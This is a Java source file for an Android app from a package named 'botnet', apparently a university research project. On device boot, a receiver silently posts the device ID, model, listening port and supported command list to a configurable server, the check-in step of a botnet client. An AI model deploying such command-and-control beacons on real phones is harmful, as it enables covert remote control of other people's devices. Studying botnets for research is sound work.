package de.tudarmstadt.botnet.janus_yanai;

import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.*;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.widget.Toast;


class SenderTask extends AsyncTask<Object, Void, CharSequence> {

	Context context;
	
	SenderTask(Context context) {
		super();
		this.context = context;
	}
	
	@Override
	protected CharSequence doInBackground(Object... params) {
	    HttpClient httpclient = new DefaultHttpClient();
	    HttpPost httppost = new HttpPost("http://" + BotClientActivity.getIP(context) + "/updatestatus");

	    try {
	        List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
	        nameValuePairs.add(new BasicNameValuePair("serial", Config.getID(context)));
	        nameValuePairs.add(new BasicNameValuePair("status", ( ((Boolean) params[0]) ? "on" : "off")));
	        nameValuePairs.add(new BasicNameValuePair("model", android.os.Build.MODEL));
	        nameValuePairs.add(new BasicNameValuePair("port", String.valueOf(Config.serverport)));
	        nameValuePairs.add(new BasicNameValuePair("servercommands", new ServerActions().getCommands().toString()));
	        httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	        
	        HttpResponse response = httpclient.execute(httppost);
	        //Toast.makeText(context, new Scanner(response.getEntity().getContent()).useDelimiter("\\A").next(), Toast.LENGTH_LONG).show();
	        return new Scanner(response.getEntity().getContent()).useDelimiter("\\A").next();
	    } catch (Exception e) {
	    	return Config.getID(context) + ": " + e.getMessage();
	    }
	}
	
	@Override
	protected void onPostExecute(CharSequence result) {
		Toast.makeText(context, result, Toast.LENGTH_SHORT);
	}
	
}



public class BootCompleteReceiver extends BroadcastReceiver {
	
		
	public static void sendNotification(Context context, boolean status) {
		new SenderTask(context).execute(status);
	}
	
	@Override
	public void onReceive(Context context, Intent intent) {
		BootCompleteReceiver.sendNotification(context, true);
		
		// TODO
		//Intent newinIntent = new Intent(context, ServerService.class);
        //context.startService(newinIntent);
	}

}
